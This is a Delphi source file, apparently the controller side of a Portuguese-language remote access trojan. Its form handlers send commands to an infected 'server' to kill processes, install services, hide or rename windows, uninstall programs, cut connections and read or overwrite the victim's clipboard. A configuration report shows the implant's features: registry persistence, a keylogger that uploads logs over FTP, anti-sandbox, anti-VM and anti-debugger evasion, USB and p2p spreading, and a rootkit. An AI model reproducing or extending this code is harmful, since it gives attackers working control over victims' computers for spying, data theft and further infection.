  EnviarString(Servidor.Athread, INSTALARSERVICO + '|' + nome_serv + '|' + desc_serv + '|' + dir_serv + '|', true);
end;


procedure TFormFuncoesDiversas.Button3Click(Sender: TObject);
begin
  Atualizar3.Enabled := false;
  Button3.Enabled := false;
  StatusBar1.Panels.Items[0].Text := Traduzidos[164];
  ListView3.Clear;
  EnviarString(Servidor.Athread, LISTARJANELAS + '|', true);
end;

procedure TFormFuncoesDiversas.ListView3CustomDrawItem(
  Sender: TCustomListView; Item: TListItem; State: TCustomDrawState;
  var DefaultDraw: Boolean);
begin
  if Item.Data <> nil then
  begin
    Sender.Canvas.Font.Color := TColor(Item.Data);
  end else
  Sender.Canvas.Font.Color := ClBlack;
end;

procedure TFormFuncoesDiversas.PopupMenuProcessosPopup(Sender: TObject);
begin
  Finalizar1.Enabled := ListView1.Selected <> nil;
end;

procedure TFormFuncoesDiversas.PopupMenuServicosPopup(Sender: TObject);
begin
  Iniciar1.Enabled := ListView2.Selected <> nil;
  Parar1.Enabled := ListView2.Selected <> nil;
  Desinstalar1.Enabled := ListView2.Selected <> nil;
  Instalar1.Enabled := ListView2.Selected <> nil;
end;

procedure TFormFuncoesDiversas.PopupMenuJanelasPopup(Sender: TObject);
begin
  Fechar1.Enabled := ListView3.Selected <> nil;
  Maximizar1.Enabled := ListView3.Selected <> nil;
  Minimizar1.Enabled := ListView3.Selected <> nil;
  MostrarRestaurar1.Enabled := ListView3.Selected <> nil;
  Ocultar1.Enabled := ListView3.Selected <> nil;
  Minimizartodas1.Enabled := ListView3.Selected <> nil;
  Mudaronome1.Enabled := ListView3.Selected <> nil;
  BloquearobotoX1.Enabled := ListView3.Selected <> nil;
  DesbloquearobotoXFechar1.Enabled := ListView3.Selected <> nil;
end;

procedure TFormFuncoesDiversas.PopupMenuProgInstaladosPopup(
  Sender: TObject);
begin
  Desinstalar2.Enabled := ListView4.Selected <> nil;
end;

procedure TFormFuncoesDiversas.PopupMenuPortasPopup(Sender: TObject);
begin
  DNSResolve1.Enabled := ListView5.Selected <> nil;
  Finalizarconexo1.Enabled := ListView5.Selected <> nil;
  Finalizarprocesso1.Enabled := ListView5.Selected <> nil;
end;

procedure TFormFuncoesDiversas.Fechar1Click(Sender: TObject);
begin
  if ListView3.Selected <> nil then
  EnviarString(Servidor.Athread, WINDOWS_FECHAR + '|' + ListView3.Selected.SubItems.Strings[0] + '|', true);
end;

procedure TFormFuncoesDiversas.Maximizar1Click(Sender: TObject);
begin
  if ListView3.Selected <> nil then
  EnviarString(Servidor.Athread, WINDOWS_MAX + '|' + ListView3.Selected.SubItems.Strings[0] + '|', true);
end;

procedure TFormFuncoesDiversas.Minimizar1Click(Sender: TObject);
begin
  if ListView3.Selected <> nil then
  EnviarString(Servidor.Athread, WINDOWS_MIN + '|' + ListView3.Selected.SubItems.Strings[0] + '|', true);
end;

procedure TFormFuncoesDiversas.MostrarRestaurar1Click(Sender: TObject);
begin
  if ListView3.Selected <> nil then
  EnviarString(Servidor.Athread, WINDOWS_MOSTRAR + '|' + ListView3.Selected.SubItems.Strings[0] + '|', true);
end;

procedure TFormFuncoesDiversas.Ocultar1Click(Sender: TObject);
begin
  if ListView3.Selected <> nil then
  EnviarString(Servidor.Athread, WINDOWS_OCULTAR + '|' + ListView3.Selected.SubItems.Strings[0] + '|', true);
end;

procedure TFormFuncoesDiversas.Minimizartodas1Click(Sender: TObject);
begin
  if ListView3.Selected <> nil then
  EnviarString(Servidor.Athread, WINDOWS_MIN_TODAS + '|', true);
end;

procedure TFormFuncoesDiversas.BloquearobotoX1Click(Sender: TObject);
begin
  if ListView3.Selected <> nil then
  EnviarString(Servidor.Athread, DISABLE_CLOSE + '|' + ListView3.Selected.SubItems.Strings[0] + '|', true);
end;

procedure TFormFuncoesDiversas.DesbloquearobotoXFechar1Click(
  Sender: TObject);
begin
  if ListView3.Selected <> nil then
  EnviarString(Servidor.Athread, ENABLE_CLOSE + '|' + ListView3.Selected.SubItems.Strings[0] + '|', true);
end;

procedure TFormFuncoesDiversas.Mudaronome1Click(Sender: TObject);
var
  novo: string;
begin
  novo := listview3.Selected.Caption;
  if inputquery(pchar(traduzidos[201]), pchar(traduzidos[202]), novo) = true then
  EnviarString(Servidor.Athread, WINDOWS_CAPTION + '|' + ListView3.Selected.SubItems[0] + '|' + novo + '|', true);
end;

procedure TFormFuncoesDiversas.Button4Click(Sender: TObject);
begin
  Atualizar4.Enabled := false;
  Button4.Enabled := false;
  StatusBar1.Panels.Items[0].Text := Traduzidos[164];
  ListView4.Clear;
  EnviarString(Servidor.Athread, LISTARPROGRAMASINSTALADOS + '|', true);
end;

procedure TFormFuncoesDiversas.Desinstalar2Click(Sender: TObject);
begin
  if (ListView4.Selected <> nil) and (length(ListView4.Selected.SubItems.Strings[0]) > 1) then
  if messagedlg(pchar(traduzidos[221]), mtConfirmation, [mbYes, mbNo], 0) = IdNo then exit;
  EnviarString(Servidor.Athread, DESINSTALARPROGRAMA + '|' + ListView4.Selected.SubItems.Strings[0] + '|', true);
end;

procedure TFormFuncoesDiversas.ListView5CustomDrawItem(
  Sender: TCustomListView; Item: TListItem; State: TCustomDrawState;
  var DefaultDraw: Boolean);
begin
  if Item.Data <> nil then
  begin
    Sender.Canvas.Font.Color := TColor(Item.Data);
  end else
  Sender.Canvas.Font.Color := ClBlack;
end;

procedure TFormFuncoesDiversas.Button5Click(Sender: TObject);
begin
  Atualizar5.Enabled := false;
  Button5.Enabled := false;
  StatusBar1.Panels.Items[0].Text := Traduzidos[164];
  ListView5.Clear;

  if DNSResolve1.Checked = false then EnviarString(Servidor.Athread, LISTARPORTAS + '|', true) else
  EnviarString(Servidor.Athread, LISTARPORTASDNS + '|', true);
end;

procedure TFormFuncoesDiversas.DNSResolve1Click(Sender: TObject);
begin
  DNSResolve1.Checked := not DNSResolve1.Checked;
end;

procedure TFormFuncoesDiversas.Finalizarprocesso1Click(Sender: TObject);
begin
  if ListView5.Selected <> nil then
  if messagedlg(pchar(traduzidos[170]), mtConfirmation, [mbYes, mbNo], 0) = IdNo then exit;
  EnviarString(Servidor.Athread, FINALIZARPROCESSOPORTAS + '|' + ListView5.Selected.SubItems.Strings[5] + '|', true);
end;

procedure TFormFuncoesDiversas.Finalizarconexo1Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, FINALIZARCONEXAO + '|' +
                                 ListView5.Selected.SubItems[0] + '|' +
                                 ListView5.Selected.SubItems[1] + '|' +
                                 ListView5.Selected.SubItems[2] + '|' +
                                 ListView5.Selected.SubItems[3] + '|', true)
end;

function ShowBoolToStr(bool: string): string;
begin
  result := traduzidos[24];
  if bool = 'TRUE' then result := traduzidos[25];
end;

procedure TFormFuncoesDiversas.GerarRelatorio(Configs: string);
var
  i: integer;
  TempStr: string;
begin
  Memo1.Font.Name := 'Courier New';
  Memo1.Lines.add(tabsheet6.Caption);
  Memo1.Lines.add('');

  Memo1.Lines.add(traduzidos[36]); // Conexao

  TempStr := copy(Configs, 1, pos('#', Configs) - 1);
  delete(Configs, 1, pos('#', Configs));
  i := 0;
  while TempStr <> '' do
  begin
    Memo1.Lines.add(justl(traduzidos[42] + ' ' + inttostr(i), 40) + justl(copy(TempStr, 1, pos('|', TempStr) - 1), 0));
    delete(TempStr, 1, pos('|', TempStr));
    inc(i);
  end;

  Memo1.Lines.add(justl(traduzidos[2], 40) + justl(copy(Configs, 1, pos('|', Configs) - 1), 0));
  delete(Configs, 1, pos('|', Configs)); //Identificação

  Memo1.Lines.add(justl(traduzidos[44], 40) + justl(copy(Configs, 1, pos('|', Configs) - 1), 0));
  delete(Configs, 1, pos('|', Configs)); // senha

  Memo1.Lines.add('');

  Memo1.Lines.add(traduzidos[37]);
  // local da instalação
  Memo1.Lines.add(justl(traduzidos[45], 40) + justl(copy(Configs, 1, pos('|', Configs) - 1), 0));
  delete(Configs, 1, pos('|', Configs));
  // Nome do processo
  Memo1.Lines.add(justl(traduzidos[237], 40) + justl(copy(Configs, 1, pos('|', Configs) - 1), 0));
  delete(Configs, 1, pos('|', Configs));
  // HKLM
  Memo1.Lines.add(justl('HKLM\....\Run', 40) + justl(copy(Configs, 1, pos('|', Configs) - 1), 0));
  delete(Configs, 1, pos('|', Configs));
  // HKCU
  Memo1.Lines.add(justl('HKCU\....\Run', 40) + justl(copy(Configs, 1, pos('|', Configs) - 1), 0));
  delete(Configs, 1, pos('|', Configs));
  // ActiveX
  Memo1.Lines.add(justl('Active Setup', 40) + justl(copy(Configs, 1, pos('|', Configs) - 1), 0));
  delete(Configs, 1, pos('|', Configs));
  // Policies
  Memo1.Lines.add(justl('Policies StratUp', 40) + justl(copy(Configs, 1, pos('|', Configs) - 1), 0));
  delete(Configs, 1, pos('|', Configs));
  //Persistência
  Memo1.Lines.add(justl(traduzidos[103], 40) + justl(ShowBoolToStr(copy(Configs, 1, pos('|', Configs) - 1)), 0));
  delete(Configs, 1, pos('|', Configs));
  //Ocultar arquivos
  Memo1.Lines.add(justl(traduzidos[104], 40) + justl(ShowBoolToStr(copy(Configs, 1, pos('|', Configs) - 1)), 0));
  delete(Configs, 1, pos('|', Configs));
  //Mudar data de criação
  Memo1.Lines.add(justl(traduzidos[105], 40) + justl(ShowBoolToStr(copy(Configs, 1, pos('|', Configs) - 1)), 0));
  delete(Configs, 1, pos('|', Configs));
  //melt
  Memo1.Lines.add(justl(traduzidos[116], 40) + justl(ShowBoolToStr(copy(Configs, 1, pos('|', Configs) - 1)), 0));
  delete(Configs, 1, pos('|', Configs));
  //mutex
  Memo1.Lines.add(justl('Mutex', 40) + justl(copy(Configs, 1, pos('|', Configs) - 1), 0));
  delete(Configs, 1, pos('|', Configs));

  Memo1.Lines.add('');

  Memo1.Lines.add(traduzidos[38]);
  // Título da mensagem
  Memo1.Lines.add(justl(traduzidos[238], 40) + justl(copy(Configs, 1, pos('|', Configs) - 1), 0));
  delete(Configs, 1, pos('|', Configs));
  // Texto da mensagem
  Memo1.Lines.add(justl(traduzidos[239], 40) + justl(copy(Configs, 1, pos('|', Configs) - 1), 0));
  delete(Configs, 1, pos('|', Configs));

  Memo1.Lines.add('');

  Memo1.Lines.add(traduzidos[39]);
  //keylogger ativo
  Memo1.Lines.add(justl(traduzidos[63], 40) + justl(ShowBoolToStr(copy(Configs, 1, pos('|', Configs) - 1)), 0));
  delete(Configs, 1, pos('|', Configs));
  //logs por FTP
  Memo1.Lines.add(justl(traduzidos[74], 40) + justl(ShowBoolToStr(copy(Configs, 1, pos('|', Configs) - 1)), 0));
  delete(Configs, 1, pos('|', Configs));
  //enviar para
  Memo1.Lines.add(justl(traduzidos[65], 40) + justl(copy(Configs, 1, pos('|', Configs) - 1), 0));
  delete(Configs, 1, pos('|', Configs));
  //FTP Dir
  Memo1.Lines.add(justl(traduzidos[49], 40) + justl(copy(Configs, 1, pos('|', Configs) - 1), 0));
  delete(Configs, 1, pos('|', Configs));
  //FTP User
  Memo1.Lines.add(justl('FTP User', 40) + justl(copy(Configs, 1, pos('|', Configs) - 1), 0));
  delete(Configs, 1, pos('|', Configs));
  //FTP Password
  Memo1.Lines.add(justl('FTP Password', 40) + justl(copy(Configs, 1, pos('|', Configs) - 1), 0));
  delete(Configs, 1, pos('|', Configs));
  //Porta
  Memo1.Lines.add(justl(traduzidos[68], 40) + justl(copy(Configs, 1, pos('|', Configs) - 1), 0));
  delete(Configs, 1, pos('|', Configs));
  //enviar a cada
  Memo1.Lines.add(justl(traduzidos[66], 40) + justl(copy(Configs, 1, pos('|', Configs) - 1) + ' ' + traduzidos[67], 0));
  delete(Configs, 1, pos('|', Configs));

  Memo1.Lines.add('');

  Memo1.Lines.add(traduzidos[40]);
  Memo1.Lines.add(justl('Anti Sandboxie', 40) + justl(ShowBoolToStr(copy(Configs, 1, pos('|', Configs) - 1)), 0));
  delete(Configs, 1, pos('|', Configs));
  Memo1.Lines.add(justl('Anti Virtual PC', 40) + justl(ShowBoolToStr(copy(Configs, 1, pos('|', Configs) - 1)), 0));
  delete(Configs, 1, pos('|', Configs));
  Memo1.Lines.add(justl('Anti VMWare', 40) + justl(ShowBoolToStr(copy(Configs, 1, pos('|', Configs) - 1)), 0));
  delete(Configs, 1, pos('|', Configs));
  Memo1.Lines.add(justl('Anti VirtualBox', 40) + justl(ShowBoolToStr(copy(Configs, 1, pos('|', Configs) - 1)), 0));
  delete(Configs, 1, pos('|', Configs));
  Memo1.Lines.add(justl('Anti ThreatExpert', 40) + justl(ShowBoolToStr(copy(Configs, 1, pos('|', Configs) - 1)), 0));
  delete(Configs, 1, pos('|', Configs));
  Memo1.Lines.add(justl('Anti Anubis', 40) + justl(ShowBoolToStr(copy(Configs, 1, pos('|', Configs) - 1)), 0));
  delete(Configs, 1, pos('|', Configs));
  Memo1.Lines.add(justl('Anti CWSandbox', 40) + justl(ShowBoolToStr(copy(Configs, 1, pos('|', Configs) - 1)), 0));
  delete(Configs, 1, pos('|', Configs));
  Memo1.Lines.add(justl('Anti JoeBox', 40) + justl(ShowBoolToStr(copy(Configs, 1, pos('|', Configs) - 1)), 0));
  delete(Configs, 1, pos('|', Configs));
  Memo1.Lines.add(justl('Anti Norman Sandbox', 40) + justl(ShowBoolToStr(copy(Configs, 1, pos('|', Configs) - 1)), 0));
  delete(Configs, 1, pos('|', Configs));
  Memo1.Lines.add(justl('Anti SoftIce', 40) + justl(ShowBoolToStr(copy(Configs, 1, pos('|', Configs) - 1)), 0));
  delete(Configs, 1, pos('|', Configs));
  Memo1.Lines.add(justl('Anti Debugger', 40) + justl(ShowBoolToStr(copy(Configs, 1, pos('|', Configs) - 1)), 0));
  delete(Configs, 1, pos('|', Configs));
  Memo1.Lines.add(justl(traduzidos[47], 40) + justl(ShowBoolToStr(copy(Configs, 1, pos('|', Configs) - 1)), 0));
  delete(Configs, 1, pos('|', Configs));


  Memo1.Lines.add('');

  Memo1.Lines.add(justl('USB Spreader', 40) + justl(ShowBoolToStr(copy(Configs, 1, pos('|', Configs) - 1)), 0));
  delete(Configs, 1, pos('|', Configs));
  Memo1.Lines.add(justl('p2p Spreader', 40) + justl(copy(Configs, 1, pos('|', Configs) - 1), 0));
  delete(Configs, 1, pos('|', Configs));
  Memo1.Lines.add(justl('RootKIT', 40) + justl(ShowBoolToStr(copy(Configs, 1, pos('|', Configs) - 1)), 0));
  delete(Configs, 1, pos('|', Configs));

  SendMessage(Memo1.Handle, EM_SCROLL, SB_TOP, 0);
end;

procedure TFormFuncoesDiversas.Button6Click(Sender: TObject);
begin
  memo1.Clear;
  Button6.Enabled := false;
  StatusBar1.Panels.Items[0].Text := Traduzidos[164];
  EnviarString(Servidor.Athread, CONFIGURACOESDOSERVER + '|', true);
end;

procedure TFormFuncoesDiversas.Button8Click(Sender: TObject);
begin
  if memo2.Text = '' then EnviarString(Servidor.Athread, LIMPARCLIPBOARD + '|', true) else
  EnviarString(Servidor.Athread, DEFINIRCLIPBOARD + '|' + memo2.Text + '|');
end;

procedure TFormFuncoesDiversas.Button7Click(Sender: TObject);
begin
  memo2.Clear;
  Button7.Enabled := false;
  StatusBar1.Panels.Items[0].Text := Traduzidos[164];
  EnviarString(Servidor.Athread, OBTERCLIPBOARD + '|', true);
end;

procedure TFormFuncoesDiversas.FormCreate(Sender: TObject);
begin
  memo1.Clear;
end;

procedure TFormFuncoesDiversas.PageControl1Change(Sender: TObject);
begin
  Button1.Enabled := true;
  Atualizar1.Enabled := true;

  Button2.Enabled := true;
  Atualizar2.Enabled := true;

  Button3.Enabled := true;
  Atualizar3.Enabled := true;

  Button4.Enabled := true;
  Atualizar4.Enabled := true;

  Button5.Enabled := true;
  Atualizar5.Enabled := true;

  Button6.Enabled := true;
  Button7.Enabled := true;
end;

end.
